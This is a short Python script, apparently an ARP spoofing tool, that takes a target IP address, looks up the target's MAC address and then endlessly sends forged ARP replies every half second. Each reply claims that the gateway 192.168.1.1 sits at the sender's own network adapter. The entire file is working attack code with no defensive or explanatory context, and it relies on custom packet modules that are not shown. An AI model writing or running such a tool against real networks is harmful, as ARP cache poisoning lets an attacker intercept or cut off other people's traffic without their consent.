import sys
from coarp2 import CoArpReply2
import time
from coshake import HexStreamToBytes


if '__main__' == __name__:
    if len(sys.argv)<2:
        print("Please specifiy a target.")
        sys.exit(1)

    targetIP = sys.argv[1]
    
    import RapLanV1
    dev1 = RapLanV1.PcapIf(RapLanV1.AdList()[0])
    print(dev1.AdDesc)
    gate = "192.168.1.1"
    tmac = RapLanV1.SendArp(targetIP)
    
    if not tmac[0]:
        print("Cannot retrieve gate's mac.")
        sys.exit(True)

    ans = CoArpReply2(gate,dev1.PhysicalAddr, targetIP,tmac[2])

    cnt = 0
    while True:
        time.sleep(0.5)
        dev1.Send(HexStreamToBytes(ans.toHexStream()))
        print("Go ~ ",cnt)
        cnt +=1
    
